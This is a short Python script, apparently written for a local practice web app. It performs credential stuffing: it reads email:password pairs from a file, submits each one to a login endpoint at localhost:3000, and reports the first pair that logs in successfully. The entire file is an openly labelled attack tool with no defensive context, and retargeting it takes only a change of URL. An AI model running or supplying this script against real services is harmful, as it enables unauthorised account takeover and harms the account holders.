import requests

TARGET_URL = "http://localhost:3000/rest/user/login"

def run_attack():
    with open("creds.txt", "r") as f:
        for line in f:
            line = line.strip()

            if ":" not in line:
                continue

            email, password = line.split(":", 1)

            response = requests.post(
                TARGET_URL,
                json={"email": email, "password": password}
            )

            if response.status_code < 400 and "Invalid" not in response.text:
                print("\nSUCCESS")
                print(email, password)
                return
            else:
                print("Failed:", email, password)

    print("Done.")

if __name__ == "__main__":
    run_attack()